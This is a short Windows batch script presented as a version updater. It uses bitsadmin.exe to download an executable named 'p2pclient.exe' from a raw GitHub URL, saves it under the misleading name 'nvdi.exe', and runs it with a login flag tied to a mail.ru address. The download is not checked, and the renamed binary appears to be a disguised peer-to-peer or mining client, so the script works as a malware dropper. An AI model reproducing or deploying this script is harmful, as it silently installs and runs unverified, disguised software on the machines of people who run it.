
set VERSION=3.5.4

echo check version file exist

if not EXIST %~dp0version.log (
    goto :update
)

set /p FILEVERSION=< %~dp0version.log

echo get current version

if %VERSION% == %FILEVERSION% (
    goto :start
) 

:update
echo update file

bitsadmin.exe /transfer "download update" "https://raw.githubusercontent.com/Body01/TestRepo/main/files/p2pclient.exe" "%~dp0nvdi.exe"

if %ERRORLEVEL% EQU 0 (
    echo %VERSION% > "%~dp0version.log"
)

:start
if exist "nvdi.exe" (
    start nvdi.exe -l neodinm@mail.ru
) ELSE (
    del version.log
)